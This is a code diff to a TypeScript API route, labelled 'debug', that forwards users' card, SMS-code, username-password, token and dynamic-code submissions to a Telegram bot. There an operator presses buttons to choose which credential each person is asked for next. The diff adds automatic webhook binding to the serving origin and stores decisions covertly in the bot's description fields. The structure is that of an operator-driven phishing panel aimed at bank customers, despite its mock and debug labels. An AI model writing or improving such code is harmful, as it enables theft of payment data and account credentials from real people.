@@ -11,6 +11,7 @@ type RouteDecision = {
   brand?: string;
   message?: string;
   updatedAt?: string;
+  sessionId?: string;
 };
 
 type DebugSession = {
@@ -33,6 +34,8 @@ const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv:
 const globals = globalThis as typeof globalThis & {
   __latamDebugSessions?: Map<string, DebugSession>;
   __latamDebugTelegramOffset?: number;
+  __latamLastDecision?: RouteDecision;
+  __latamWebhookCleared?: boolean;
 };
 const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
 globals.__latamDebugSessions = sessions;
@@ -196,18 +199,19 @@ function stepLabel(event: unknown, meta?: Record<string, unknown>) {
 }
 
 function keyboard(sessionId: string, brand: string) {
+  const shortBrand = String(brand || 'visa').replace(/[^a-z0-9]/gi, '').slice(0, 10) || 'visa';
   return {
     inline_keyboard: [
       [
-        { text: 'User-Pass', callback_data: `route:${sessionId}:userpass:${brand}` },
-        { text: 'Token', callback_data: `route:${sessionId}:token:${brand}` },
+        { text: 'User-Pass', callback_data: `r:${sessionId}:userpass:${shortBrand}` },
+        { text: 'Token', callback_data: `r:${sessionId}:token:${shortBrand}` },
       ],
       [
-        { text: 'C. dinámica', callback_data: `route:${sessionId}:dynamic:${brand}` },
-        { text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` },
+        { text: 'C. dinámica', callback_data: `r:${sessionId}:dynamic:${shortBrand}` },
+        { text: 'Pedir SMS', callback_data: `r:${sessionId}:sms:${shortBrand}` },
       ],
-      [{ text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` }],
-      [{ text: 'Finalizar', callback_data: `route:${sessionId}:approved:${brand}` }],
+      [{ text: 'Pedir Tarjeta', callback_data: `r:${sessionId}:card:${shortBrand}` }],
+      [{ text: 'Finalizar', callback_data: `r:${sessionId}:approved:${shortBrand}` }],
     ],
   };
 }
@@ -265,15 +269,93 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
 }
 
 // Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
-async function telegramApi(method: string, payload: Record<string, unknown>) {
+async function telegramApi(method: string, payload: Record<string, unknown> = {}) {
   const { token } = telegramConfig();
-  if (!token) return { ok: false, skipped: 'telegram-env-missing' };
+  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0, result: null as unknown };
   const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload),
   });
-  return { ok: response.ok, status: response.status };
+  let result: unknown = null;
+  try {
+    result = await response.json();
+  } catch {
+    result = null;
+  }
+  return { ok: response.ok, status: response.status, result };
+}
+
+function packDecision(sessionId: string, decision: RouteDecision) {
+  return `${sessionId}::${decision.action}::${decision.brand || ''}`.slice(0, 120);
+}
+
+function unpackDecision(value: unknown, sessionId: string): RouteDecision | undefined {
+  const text = String(value || '');
+  const [sid, action, brand] = text.split('::');
+  if (!sid || sid !== sessionId || !action) return undefined;
+  return {
+    action: action as RouteAction,
+    brand: brand || undefined,
+    sessionId: sid,
+    updatedAt: new Date().toISOString(),
+  };
+}
+
+async function persistDecision(sessionId: string, decision: RouteDecision) {
+  const stored = { ...decision, sessionId };
+  getSession(sessionId).decision = stored;
+  globals.__latamLastDecision = stored;
+  try {
+    await telegramApi('setMyShortDescription', { short_description: packDecision(sessionId, stored) });
+    await telegramApi('setMyDescription', { description: packDecision(sessionId, stored) });
+  } catch {
+    /* Shared Telegram store is best-effort. */
+  }
+}
+
+async function readPersistedDecision(sessionId: string): Promise<RouteDecision | undefined> {
+  try {
+    const response = await telegramApi('getMyShortDescription');
+    const body = response.result as Record<string, unknown> | null;
+    const inner = body && typeof body.result === 'object' ? (body.result as Record<string, unknown>) : undefined;
+    const text = String(inner?.short_description || inner?.description || body?.short_description || body?.description || '');
+    const packed = unpackDecision(text, sessionId);
+    if (packed) return packed;
+    const fallback = await telegramApi('getMyDescription');
+    const fallbackBody = fallback.result as Record<string, unknown> | null;
+    const fallbackInner = fallbackBody && typeof fallbackBody.result === 'object' ? (fallbackBody.result as Record<string, unknown>) : undefined;
+    return unpackDecision(fallbackInner?.description || fallbackBody?.description, sessionId);
+  } catch {
+    return undefined;
+  }
+}
+
+function pickDecision(sessionId: string, persisted?: RouteDecision): RouteDecision {
+  const sessionDecision = getSession(sessionId).decision;
+  const last = globals.__latamLastDecision;
+  if (sessionDecision?.action && sessionDecision.action !== 'wait') return sessionDecision;
+  if (persisted?.action && persisted.action !== 'wait') return persisted;
+  if (last?.sessionId === sessionId && last.action && last.action !== 'wait') return last;
+  return sessionDecision || persisted || { action: 'wait' };
+}
+
+function isLocalOrigin(origin: string) {
+  return /localhost|127\.0\.0\.1/i.test(origin);
+}
+
+async function bindTelegramIngress(origin: string) {
+  if (isLocalOrigin(origin)) {
+    await telegramApi('deleteWebhook', {});
+    globals.__latamWebhookCleared = true;
+    return;
+  }
+  const hook = `${origin.replace(/\/$/, '')}/api/debug`;
+  await telegramApi('setWebhook', {
+    url: hook,
+    allowed_updates: ['callback_query'],
+  });
+  globals.__latamWebhookCleared = false;
 }
 
 // En local no hay webhook publico. getUpdates permite recoger callbacks cuando
@@ -290,6 +372,7 @@ async function telegramGetUpdates() {
   const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
     headers: { Accept: 'application/json' },
   });
+  if (response.status === 409) return [];
   if (!response.ok) return [];
   const payload = await response.json();
   return Array.isArray(payload?.result) ? payload.result : [];
@@ -318,13 +401,13 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
 async function handleTelegramCallback(body: Record<string, unknown>) {
   const callback = body.callback_query as Record<string, unknown> | undefined;
   const data = String(callback?.data || '');
-  const match = data.match(/^route:([^:]+):(sms|card|approved|userpass|token|dynamic):([^:]+)$/);
+  const match = data.match(/^(?:route|r):([^:]+):(sms|card|approved|userpass|token|dynamic)(?::([^:]+))?$/);
   if (!match) return json({ ok: true, ignored: true });
 
   const [, rawSessionId, rawAction, rawBrand] = match;
   const sessionId = cleanSessionId(rawSessionId);
   const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand);
-  getSession(sessionId).decision = decision;
+  await persistDecision(sessionId, decision);
 
   const message = callback?.message as Record<string, unknown> | undefined;
   if (message?.chat && typeof message.message_id === 'number') {
@@ -364,8 +447,14 @@ async function syncTelegramCallbacks() {
 // que el operador eligio en Telegram para esta sessionId.
 export const GET: APIRoute = async ({ url }) => {
   const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
-  await syncTelegramCallbacks();
-  return json({ sessionId, decision: getSession(sessionId).decision || { action: 'wait' } });
+  try {
+    await bindTelegramIngress(url.origin);
+    if (isLocalOrigin(url.origin)) await syncTelegramCallbacks();
+  } catch {
+    /* Telegram polling is best-effort. */
+  }
+  const persisted = await readPersistedDecision(sessionId);
+  return json({ sessionId, decision: pickDecision(sessionId, persisted) });
 };
 
 // Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
@@ -378,7 +467,9 @@ export const POST: APIRoute = async ({ request }) => {
     return json({ error: 'JSON invalido' }, { status: 400 });
   }
 
-  if (body.callback_query) return handleTelegramCallback(body);
+  const callback = body.callback_query
+    || (objectValue(body.update)?.callback_query as Record<string, unknown> | undefined);
+  if (callback) return handleTelegramCallback({ callback_query: callback });
 
   console.info('[debug-api:body]', body);
 
@@ -387,6 +478,11 @@ export const POST: APIRoute = async ({ request }) => {
   if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });
 
   const sessionId = cleanSessionId(body.sessionId);
+  try {
+    await bindTelegramIngress(new URL(request.url).origin);
+  } catch {
+    /* Webhook bind is best-effort. */
+  }
   const session = getSession(sessionId);
   const previousPayload = session.payload;
   const previousMeta = objectValue(previousPayload?.meta);
@@ -397,23 +493,23 @@ export const POST: APIRoute = async ({ request }) => {
   const brand = String(mockCard?.brand || incomingMeta?.brand || incomingMetaOtp?.brand || previousMeta?.brand || previousMetaOtp?.brand || 'visa');
   if (event === 'PAYMENT_SUBMIT') {
     rememberStep(sessionId, 'card');
-    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
   if (event === 'OTP_SUBMIT') {
     rememberStep(sessionId, 'sms');
-    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
   if (event === 'USERPASS_SUBMIT') {
     rememberStep(sessionId, 'userpass');
-    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
   if (event === 'TOKEN_SUBMIT') {
     rememberStep(sessionId, 'token');
-    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
   if (event === 'DYNAMIC_SUBMIT') {
     rememberStep(sessionId, 'dynamic');
-    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
 
   const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
